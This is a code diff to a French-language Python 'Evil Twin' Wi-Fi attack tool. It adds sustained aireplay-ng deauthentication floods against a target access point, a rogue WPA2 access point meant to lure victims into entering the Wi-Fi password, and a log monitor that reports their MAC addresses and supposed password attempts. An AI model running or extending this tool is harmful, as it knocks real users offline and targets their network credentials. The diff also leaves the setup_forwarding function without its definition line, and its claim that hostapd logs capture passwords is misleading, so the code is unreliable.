@@ -290,7 +290,32 @@ def select_ap(aps):
         print(f"{RED}[-] Choix invalide !{RESET}")
         sys.exit(1)
 
-def create_fake_ap(mon_iface, ssid, bssid, channel):
+def aggressive_deauth(mon_iface, bssid, duration=30):
+    """Lance une attaque de déauthentification agressive"""
+    print(f"\n{RED}[+] Attaque de déauthentification agressive pendant {duration}s...{RESET}")
+    print(f"{YELLOW}[*] Cible : {bssid}{RESET}")
+    
+    end_time = time.time() + duration
+    deauth_count = 0
+    
+    while time.time() < end_time:
+        # Déauth broadcast
+        proc = subprocess.Popen(
+            ["aireplay-ng", "--deauth", "10", "-a", bssid, mon_iface],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        deauth_count += 1
+        time.sleep(0.5)
+        proc.terminate()
+        
+        # Afficher progression toutes les 5 secondes
+        if deauth_count % 10 == 0:
+            remaining = int(end_time - time.time())
+            print(f"{CYAN}[*] {deauth_count} salves envoyées | Temps restant: {remaining}s{RESET}")
+    
+    print(f"{GREEN}[+] Déauthentification terminée. Total: {deauth_count} salves{RESET}")
+
+def create_fake_ap(mon_iface, ssid, bssid, channel, force_wpa=True):
     """Crée un faux point d'accès avec hostapd et dnsmasq"""
     global active_processes
     
@@ -311,17 +336,8 @@ def create_fake_ap(mon_iface, ssid, bssid, channel):
     subprocess.call(["iwconfig", mon_iface, "channel", str(channel)],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
-    # Lancer aireplay pour déauth (optionnel)
-    print(f"{YELLOW}[*] Lancement de l'attaque de déauthentification...{RESET}")
-    deauth_proc = subprocess.Popen(
-        ["aireplay-ng", "--deauth", "0", "-a", bssid, mon_iface],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-    )
-    active_processes.append(deauth_proc)
-    
-    # Configuration hostapd
-    hostapd_conf = f"""/tmp/hostapd_evil.conf
-interface={mon_iface}
+    # Configuration hostapd de base
+    hostapd_conf = f"""interface={mon_iface}
 driver=nl80211
 ssid={ssid}
 hw_mode=g
@@ -330,19 +346,19 @@ macaddr_acl=0
 ignore_broadcast_ssid=0
 """
     
-    # Demander si on veut de la sécurité (WPA2)
-    secure = input(f"{ORANGE}[?] Ajouter une protection WPA2? (y/N) : {RESET}").strip().lower()
-    if secure == 'y':
-        password = input(f"{ORANGE}[?] Mot de passe (min 8 caractères) : {RESET}").strip()
-        if len(password) >= 8:
-            hostapd_conf += f"""auth_algs=1
+    # Configuration WPA2 obligatoire pour forcer la capture de mot de passe
+    if force_wpa:
+        print(f"\n{CYAN}[*] Configuration WPA2 pour capturer les tentatives de connexion...{RESET}")
+        fake_password = "hackthisnetwork123"  # Mot de passe factice
+        hostapd_conf += f"""auth_algs=1
 wpa=2
-wpa_passphrase={password}
+wpa_passphrase={fake_password}
 wpa_key_mgmt=WPA-PSK
 rsn_pairwise=CCMP
+wpa_pairwise=CCMP
 """
-        else:
-            print(f"{YELLOW}[!] Mot de passe trop court, réseau ouvert créé{RESET}")
+        print(f"{YELLOW}[!] Les victimes devront entrer un mot de passe{RESET}")
+        print(f"{YELLOW}[!] Leurs tentatives seront capturées dans /tmp/hostapd_evil.log{RESET}")
     
     try:
         with open("/tmp/hostapd_evil.conf", "w") as f:
@@ -376,14 +392,15 @@ bind-interfaces
         print(f"{RED}[-] Erreur lors de la création de la configuration dnsmasq{RESET}")
         return None, None
     
-    # Lancer hostapd
-    print(f"{GREEN}[+] Démarrage de hostapd...{RESET}")
+    # Lancer hostapd avec logging
+    print(f"{GREEN}[+] Démarrage de hostapd avec capture des tentatives...{RESET}")
+    log_file = open("/tmp/hostapd_evil.log", "w")
     hostapd_proc = subprocess.Popen(
         ["hostapd", "/tmp/hostapd_evil.conf"],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        stdout=log_file, stderr=log_file
     )
     active_processes.append(hostapd_proc)
-    time.sleep(2)
+    time.sleep(3)
     
     # Lancer dnsmasq
     print(f"{GREEN}[+] Démarrage de dnsmasq...{RESET}")
@@ -395,7 +412,51 @@ bind-interfaces
     
     return hostapd_proc, dnsmasq_proc
 
-def setup_forwarding(inet_iface, mon_iface):
+def monitor_connections():
+    """Monitore les tentatives de connexion dans les logs"""
+    print(f"\n{CYAN}[*] Démarrage du monitoring des connexions...{RESET}")
+    log_file = "/tmp/hostapd_evil.log"
+    
+    if not os.path.exists(log_file):
+        return
+    
+    # Suivre le fichier en temps réel
+    seen_positions = 0
+    captured_attempts = []
+    
+    while True:
+        try:
+            with open(log_file, "r") as f:
+                f.seek(seen_positions)
+                new_lines = f.readlines()
+                seen_positions = f.tell()
+                
+                for line in new_lines:
+                    # Détecter les tentatives de connexion
+                    if "STA" in line and "IEEE 802.11: associated" in line:
+                        # Extraire l'adresse MAC
+                        match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
+                        if match:
+                            mac = match.group(0)
+                            timestamp = time.strftime("%H:%M:%S")
+                            print(f"{GREEN}[+] [{timestamp}] Client connecté: {mac}{RESET}")
+                    
+                    # Détecter les échecs d'authentification (mauvais mot de passe)
+                    if "WPA" in line and "failed" in line.lower():
+                        match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
+                        if match:
+                            mac = match.group(0)
+                            timestamp = time.strftime("%H:%M:%S")
+                            if mac not in captured_attempts:
+                                captured_attempts.append(mac)
+                                print(f"{RED}[!] [{timestamp}] Tentative de mot de passe capturée: {mac}{RESET}")
+                                print(f"{YELLOW}    → Vérifiez /tmp/hostapd_evil.log pour les détails{RESET}")
+            
+            time.sleep(1)
+        except Exception:
+            time.sleep(1)
+            continue
+
     """Configure le routage et NAT pour rediriger le trafic"""
     print(f"\n{GREEN}[+] Configuration du routage vers {inet_iface}...{RESET}")
     
@@ -452,8 +513,25 @@ def main():
     # Sélection de la cible
     bssid, channel, essid = select_ap(aps)
     
-    # Création du faux AP
-    hostapd_proc, dnsmasq_proc = create_fake_ap(mon_iface, essid, bssid, channel)
+    print(f"\n{BLUE}{'='*60}{RESET}")
+    print(f"{CYAN}Cible sélectionnée:{RESET}")
+    print(f"{CYAN}  • SSID : {essid}{RESET}")
+    print(f"{CYAN}  • BSSID : {bssid}{RESET}")
+    print(f"{CYAN}  • Canal : {channel}{RESET}")
+    print(f"{BLUE}{'='*60}{RESET}")
+    
+    # Demander la durée de l'attaque de déauth
+    print(f"\n{ORANGE}[?] Configuration de l'attaque:{RESET}")
+    deauth_duration = input(f"{ORANGE}    Durée de déauthentification (secondes, défaut: 30) : {RESET}").strip()
+    deauth_duration = int(deauth_duration) if deauth_duration.isdigit() else 30
+    
+    # Lancer l'attaque de déauthentification agressive
+    aggressive_deauth(mon_iface, bssid, deauth_duration)
+    
+    # Créer le faux AP avec WPA2 obligatoire
+    print(f"\n{YELLOW}[*] Création du faux AP avec protection WPA2...{RESET}")
+    print(f"{YELLOW}[*] Les clients seront forcés de se reauthentifier{RESET}")
+    hostapd_proc, dnsmasq_proc = create_fake_ap(mon_iface, essid, bssid, channel, force_wpa=True)
     
     if not hostapd_proc or not dnsmasq_proc:
         print(f"{RED}[-] Échec de la création du faux AP{RESET}")
@@ -464,9 +542,21 @@ def main():
     # Configuration du routage
     setup_forwarding(inet_iface, mon_iface)
     
+    # Continuer la déauth en arrière-plan
+    print(f"\n{YELLOW}[*] Lancement de la déauthentification continue en arrière-plan...{RESET}")
+    continuous_deauth_proc = subprocess.Popen(
+        ["aireplay-ng", "--deauth", "0", "-a", bssid, mon_iface],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    active_processes.append(continuous_deauth_proc)
+    
+    # Démarrer le monitoring dans un thread séparé
+    monitor_thread = threading.Thread(target=monitor_connections, daemon=True)
+    monitor_thread.start()
+    
     # Affichage des informations
     print(f"\n{GREEN}{'='*60}{RESET}")
-    print(f"{CYAN}[✓] Evil Twin actif !{RESET}")
+    print(f"{CYAN}[✓] Evil Twin actif avec capture de mot de passe !{RESET}")
     print(f"{CYAN}[*] SSID cible : {essid}{RESET}")
     print(f"{CYAN}[*] BSSID : {bssid}{RESET}")
     print(f"{CYAN}[*] Canal : {channel}{RESET}")
@@ -474,8 +564,12 @@ def main():
     print(f"{CYAN}[*] Interface Internet : {inet_iface}{RESET}")
     print(f"{CYAN}[*] Gateway : 10.0.0.1{RESET}")
     print(f"{GREEN}{'='*60}{RESET}")
-    print(f"\n{YELLOW}[!] Les victimes qui se connectent obtiendront une IP 10.0.0.x{RESET}")
-    print(f"{YELLOW}[!] Leur trafic sera routé via {inet_iface}{RESET}")
+    print(f"\n{RED}[!] Déauthentification continue du vrai AP{RESET}")
+    print(f"{YELLOW}[!] Les victimes seront forcées de se reconnecter au faux AP{RESET}")
+    print(f"{YELLOW}[!] Elles devront entrer le mot de passe Wi-Fi{RESET}")
+    print(f"{YELLOW}[!] Les tentatives sont loggées dans /tmp/hostapd_evil.log{RESET}")
+    print(f"{CYAN}[!] Les connexions réussies obtiendront une IP 10.0.0.x{RESET}")
+    print(f"{CYAN}[!] Leur trafic sera routé via {inet_iface}{RESET}")
     print(f"\n{ORANGE}[*] Appuyez sur Ctrl+C pour arrêter...{RESET}\n")
     
     try:
